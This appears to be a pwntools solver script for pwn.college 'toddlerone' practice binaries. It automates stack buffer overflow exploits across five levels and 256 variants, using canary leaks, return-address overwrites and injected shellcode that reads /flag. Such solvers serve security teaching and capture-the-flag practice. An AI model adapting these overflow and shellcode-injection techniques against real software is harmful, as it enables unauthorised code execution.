#!/bin/python3
from pwn import *
from pwn import p64
import tabulate as t
from termcolor import colored
from os import system
context.log_level='CRITICAL'
context.arch='amd64'
levels = 5
variants = 256
SHELLCODE = asm(shellcraft.cat('/flag'))

def solve1(variant):
	elf = ELF(f'level1.0/{variant}/toddlerone_level1.0')
	print(f"Level1.0 : {variant}",end="\r")
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#EXPLOITING
	global SHELLCODE
	
	#reading shellcode address
	io.recvuntil(b'bytes for shellcode at 0x')
	shellcode_addr = int(io.recvuntil(b'!').decode()[:-1],16)
	#Sending shellcode
	io.recvuntil(b'stdin.')
	io.sendline(SHELLCODE)
	
	buff_len = rbp - buffer
	PAYLOAD = b'A'*buff_len+\
			b'B'*8+\
			p64(shellcode_addr)

	#Sending payload Size
	io.recvuntil(b'size: ')
	io.sendline(f'{len(PAYLOAD)}'.encode())

	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)

	io.recvuntil(b'Goodbye!')
	s= io.recvall(timeout=0.01).decode('utf-8','ignore')
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])

def solve2_post(variant):
	elf = ELF(f'level2.0/{variant}/toddlerone_level2.0')
	print(f"Level2.0 POST: {variant}",end="\r")
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#EXPLOITING
	shellcode_addr = rbp+16
	global SHELLCODE
	PAYLOAD = b'A'*(rbp-buffer)+\
	    b'B'*8+\
	    p64(shellcode_addr)+\
	    SHELLCODE
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)
	io.recvuntil(b'Goodbye!')
	s= io.recvall(timeout=0.01).decode('utf-8','ignore')
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])+' - '+colored(f'{rbp-buffer+8}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")

def solve2_pre(variant):
	elf = ELF(f'level2.0/{variant}/toddlerone_level2.0')
	print(f"Level2.0 PRE : {variant}",end="\r")
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#EXPLOITING
	global SHELLCODE
	PAYLOAD = SHELLCODE+\
	    b'A'*(rbp-buffer+8-len(SHELLCODE))+\
	    p64(buffer)+\
	    asm(shellcraft.cat('/flag'))
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)
	io.recvuntil(b'Goodbye!')
	s= io.recvall().decode('utf-8','ignore')
	if (rbp-buffer+8) < len(SHELLCODE):
		return colored(str('pwn.college' in s),"red")+' - '+colored(f'{rbp-buffer+8}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")
	
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])+' - '+colored(f'{rbp-buffer+8}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")

def solve3_post(variant):
	##STARTING EXPL
	elf = ELF(f'level3.0/{variant}/toddlerone_level3.0')
	print(f"Level3.0 POST : {variant}",end="\r")
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#READING CANARY
	PAYLOAD = b'REPEAT'
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)
	io.recvuntil(b'the canary is stored at 0x')
	canary_addr = int(io.recvuntil(b'.').decode()[:-1],16)
	io.recvuntil(b'the canary value is now 0x')
	canary = int(io.recvuntil(b'.').decode()[:-1],16)

	padding1=canary_addr-buffer
	padding2=rbp-canary_addr
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	PAYLOAD = b'A'*padding1+\
		p64(canary)+\
		b'B'*padding2
	shellcode_addr = buffer+len(PAYLOAD)+8
	global SHELLCODE
	PAYLOAD += p64(shellcode_addr) + SHELLCODE
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.sendline(PAYLOAD)
	s= io.recvall().decode('utf-8','ignore')
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])+' - '+colored(f'{padding1}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")

def solve3_pre(variant):
	##STARTING EXPL
	elf = ELF(f'level3.0/{variant}/toddlerone_level3.0')
	print(f"Level3.0 PRE: {variant}",end="\r")
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#READING CANARY
	PAYLOAD = b'REPEAT'
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)
	io.recvuntil(b'the canary is stored at 0x')
	canary_addr = int(io.recvuntil(b'.').decode()[:-1],16)
	io.recvuntil(b'the canary value is now 0x')
	canary = int(io.recvuntil(b'.').decode()[:-1],16)

	global SHELLCODE
	buffer_len=canary_addr-buffer
	padding1 = buffer_len-len(SHELLCODE)
	padding2=rbp-canary_addr
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	PAYLOAD = SHELLCODE+\
		b'A'*padding1+\
		p64(canary)+\
		b'B'*padding2
	shellcode_addr = buffer
	PAYLOAD += p64(shellcode_addr)
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.sendline(PAYLOAD)
	s= io.recvall().decode('utf-8','ignore')
	if buffer_len < len(SHELLCODE):
		return colored(str('pwn.college' in s),"red")+' - '+colored(f'{buffer_len}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])+' - '+colored(f'{buffer_len}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")

def solve4_pre(variant):
	print(f"Level4.0 PRE: {variant}",end="\r")
	##CALCULATING JAIL
	io = process(["objdump","--disassemble=challenge","--no-addresses","--no-show-raw-insn","--no-addresses","--no-show-raw-insn",f"level4.0/{variant}/toddlerone_level4.0"])
	ll = io.recvuntil(b'movabs $0x').decode()
	jail_value = int(io.recvuntil(b',').decode()[:-1],16)
	jail_offset = int(ll.split('\n')[-2].split('0x')[1].split('(')[0],16)
	io.close()
	##STARTING EXPL
	elf = ELF(f'level4.0/{variant}/toddlerone_level4.0')
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#READING CANARY
	PAYLOAD = b'REPEAT'
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)
	io.recvuntil(b'the canary is stored at 0x')
	canary_addr = int(io.recvuntil(b'.').decode()[:-1],16)
	io.recvuntil(b'the canary value is now 0x')
	canary = int(io.recvuntil(b'.').decode()[:-1],16)
	#jail_offsets = [0x18,0x10,0x10,0x10,0x18,0x10,0x10,0x18,0x18,0x18,0x18,0x18,0x10,0x10,0x18,0x18]
	jail_addr = rbp-jail_offset
	global SHELLCODE
	buffer_len = jail_addr-buffer
	padding1=buffer_len-len(SHELLCODE)
	padding2=abs(canary_addr-jail_addr)-8
	padding3=abs(rbp-canary_addr)
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	PAYLOAD = SHELLCODE+\
		b'A'*padding1+\
		p64(jail_value)+\
		b'B'*padding2+\
		p64(canary)+\
		b'C'*padding3
	shellcode_addr = buffer
	PAYLOAD += p64(shellcode_addr)
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.sendline(PAYLOAD)
	s= io.recvall(timeout=0.01).decode('utf-8','ignore')
	if buffer_len < len(SHELLCODE):
		return colored(str('pwn.college' in s),"red")+' - '+colored(f'{buffer_len}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])+' - '+colored(f'{buffer_len}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")

def solve4_post(variant):
	print(f"Level4.0 POST: {variant}",end="\r")
	##CALCULATING JAIL
	io = process(["objdump","--disassemble=challenge","--no-addresses","--no-show-raw-insn",f"level4.0/{variant}/toddlerone_level4.0"])
	ll = io.recvuntil(b'movabs $0x').decode()
	jail_value = int(io.recvuntil(b',').decode()[:-1],16)
	jail_offset = int(ll.split('\n')[-2].split('0x')[1].split('(')[0],16)
	io.close()
	##STARTING EXPL
	elf = ELF(f'level4.0/{variant}/toddlerone_level4.0')
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#READING CANARY
	PAYLOAD = b'REPEAT'
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)
	io.recvuntil(b'the canary is stored at 0x')
	canary_addr = int(io.recvuntil(b'.').decode()[:-1],16)
	io.recvuntil(b'the canary value is now 0x')
	canary = int(io.recvuntil(b'.').decode()[:-1],16)
	#jail_offsets = [0x18,0x10,0x10,0x10,0x18,0x10,0x10,0x18,0x18,0x18,0x18,0x18,0x10,0x10,0x18,0x18]
	jail_addr = rbp-jail_offset
	padding1=jail_addr-buffer
	padding2=abs(canary_addr-jail_addr)-8
	padding3=abs(rbp-canary_addr)
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	PAYLOAD = b'A'*padding1+\
		p64(jail_value)+\
		b'B'*padding2+\
		p64(canary)+\
		b'C'*padding3
	shellcode_addr = buffer+len(PAYLOAD)+8
	global SHELLCODE
	PAYLOAD += p64(shellcode_addr) + SHELLCODE
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.sendline(PAYLOAD)
	s= io.recvall().decode('utf-8','ignore')
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])+' - '+colored(f'{padding1}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")

def solve5_post(variant):
	print(f"Level5.0 POST: {variant}",end="\r")
	##CALCULATING JAIL
	io = process(["objdump","--disassemble=challenge","--no-addresses","--no-show-raw-insn",f"level5.0/{variant}/toddlerone_level5.0"])
	ll = io.recvuntil(b'movabs $0x').decode()
	jail_value = int(io.recvuntil(b',').decode()[:-1],16)
	jail_offset = int(ll.split('\n')[-2].split('0x')[1].split('(')[0],16)
	io.close()
	##STARTING EXPL
	elf = ELF(f'level5.0/{variant}/toddlerone_level5.0')
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#READING CANARY
	PAYLOAD = b'REPEAT'
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)
	io.recvuntil(b'the canary is stored at 0x')
	canary_addr = int(io.recvuntil(b'.').decode()[:-1],16)
	io.recvuntil(b'the canary value is now 0x')
	canary = int(io.recvuntil(b'.').decode()[:-1],16)
	#jail_offset = [0x28,0x28,0x28,0x28,0x28,0x30,0x28,0x28,0x30,0x30,0x28,0x30,0x28,0x30,0x30,0x30]
	jail_addr = rbp-jail_offset
	padding1=jail_addr-buffer
	padding2=abs(canary_addr-jail_addr)-8
	padding3=abs(rbp-canary_addr)
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	PAYLOAD = b'A'*padding1+\
		p64(jail_value)+\
		b'B'*padding2+\
		p64(canary)+\
		b'C'*padding3
	shellcode_addr = buffer+len(PAYLOAD)+8
	global SHELLCODE
	PAYLOAD += p64(shellcode_addr) + SHELLCODE
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.sendline(PAYLOAD)
	s= io.recvall(timeout=0.01).decode('utf-8','ignore')
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])+' - '+colored(f'{padding1}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")

def solve5_pre(variant):
	print(f"Level5.0 PRE: {variant}",end="\r")
	##CALCULATING JAIL
	io = process(["objdump","--disassemble=challenge","--no-addresses","--no-show-raw-insn",f"level5.0/{variant}/toddlerone_level5.0"])
	ll = io.recvuntil(b'movabs $0x').decode()
	jail_value = int(io.recvuntil(b',').decode()[:-1],16)
	jail_offset = int(ll.split('\n')[-2].split('0x')[1].split('(')[0],16)
	io.close()
	##STARTING EXPL
	elf = ELF(f'level5.0/{variant}/toddlerone_level5.0')
	io = elf.process()
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	#READING CANARY
	PAYLOAD = b'REPEAT'
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.recvuntil(b'Send your payload')
	io.sendline(PAYLOAD)
	io.recvuntil(b'the canary is stored at 0x')
	canary_addr = int(io.recvuntil(b'.').decode()[:-1],16)
	io.recvuntil(b'the canary value is now 0x')
	canary = int(io.recvuntil(b'.').decode()[:-1],16)
	#jail_offset = [0x28,0x28,0x28,0x28,0x28,0x30,0x28,0x28,0x30,0x30,0x28,0x30,0x28,0x30,0x30,0x30]
	jail_addr = rbp-jail_offset
	global SHELLCODE
	buffer_len = jail_addr-buffer
	padding1=buffer_len-len(SHELLCODE)
	padding2=abs(canary_addr-jail_addr)-8
	padding3=abs(rbp-canary_addr)
	#READING ADDRESSES
	io.recvuntil(b'our base pointer points to 0x').decode()
	rbp = int(io.recvline().decode()[:-2],16)
	io.recvuntil(b'The input buffer begins at 0x').decode()
	buffer = int(io.recvuntil(b',').decode()[:-1],16)
	PAYLOAD = SHELLCODE+\
		b'A'*padding1+\
		p64(jail_value)+\
		b'B'*padding2+\
		p64(canary)+\
		b'C'*padding3
	shellcode_addr = buffer
	PAYLOAD += p64(shellcode_addr)
	io.sendline(f'{len(PAYLOAD)}'.encode())
	io.sendline(PAYLOAD)
	s= io.recvall(timeout=0.01).decode('utf-8','ignore')
	if buffer_len < len(SHELLCODE):
		return colored(str('pwn.college' in s),"red")+' - '+colored(f'{buffer_len}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")
	return colored(str('pwn.college' in s),("yellow","green")['pwn.college' in s])+' - '+colored(f'{buffer_len}',"blue")+f' : '+colored(f'{len(SHELLCODE)}',"cyan")


def main():
	print("┏"+"━"*40+"┓")
	print("┃"+" "*15+"SHELLCODE "+" "*15+"┃")
	print("┣"+"━"*40+"┫")
	print(shellcraft.cat("/flag"))
	print("┗"+"━"*40+"┛")
	headers = ["VARIANT","Level 1"]+ sum([[f"level{i}_post",f"level{i}_pre"]  for i in range(2,6)],[]) #["LEVEL"]+[f"Variant {v}" for v in range(variants)]
	print("Progress: ",end=" ")
	level1 = [solve1(v) for v in range(variants)]
	print("Level 1: Done")
	level2_post = [solve2_post(v) for v in range(variants)]
	print("Level 2 POST: Done")
	level2_pre = [solve2_pre(v) for v in range(variants)]
	print("Level 2 PRE: Done")
	level3_post = [solve3_post(v) for v in range(variants)]
	print("Level 3 POST: Done")
	level3_pre = [solve3_pre(v) for v in range(variants)]
	print("Level 3 PRE: Done")
	level4_post = [solve4_post(v) for v in range(variants)]
	print("Level 4 POST: Done")
	level4_pre = [solve4_pre(v) for v in range(variants)]
	print("Level 4 PRE: Done")
	level5_post = [solve5_post(v) for v in range(variants)]
	print("Level 5 POST: Done")
	level5_pre = [solve5_pre(v) for v in range(variants)]
	print("Level 5 PRE: Done")
	vs = [[f"Variant {i}",level1[i],level2_post[i],level2_pre[i],level3_post[i],level3_pre[i],level4_post[i],level4_pre[i],level5_post[i],level5_pre[i]] for i in range(variants)]
	#grid = [["Level 1"]+level1,["Level 2 (POST)"]+level2_post,["Level 2 (PRE)"]+level2_pre,["Level 3 (POST)"]+level3_post,["Level 3 (PRE)"]+level3_pre,["Level 4 (POST)"]+level4_post,["Level 4 (PRE)"]+level4_pre,["Level 5 (POST)"]+level5_post,["Level 5 (PRE)"]+level5_pre]
	print(t.tabulate(vs,headers,tablefmt="heavy_grid"))

if __name__=='__main__':
	main()
	system('rm core.*')
